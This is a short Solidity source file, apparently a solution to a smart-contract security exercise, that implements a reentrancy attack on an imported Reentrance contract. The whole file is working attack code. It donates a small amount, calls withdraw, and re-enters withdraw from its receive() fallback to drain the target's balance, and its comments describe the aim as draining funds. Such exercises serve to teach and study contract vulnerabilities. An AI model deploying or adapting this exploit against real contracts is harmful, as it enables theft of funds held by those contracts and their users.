// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        // A reentrancy attack occurs when a function
        // makes an external call to another untrusted contract.
        // Then the untrusted contract makes a recursive call back
        // to the original function in an attempt to drain funds.
        
        // Donate a little
        // Withraw it
        Reentrance(contractAddress).donate{value: 1}(address(this));
        Reentrance(contractAddress).withdraw();
    }
    receive() external payable {
        // Reentrance during withdraw by 
        // recursively withdraw from the contract
        Reentrance(contractAddress).withdraw();
    }
}
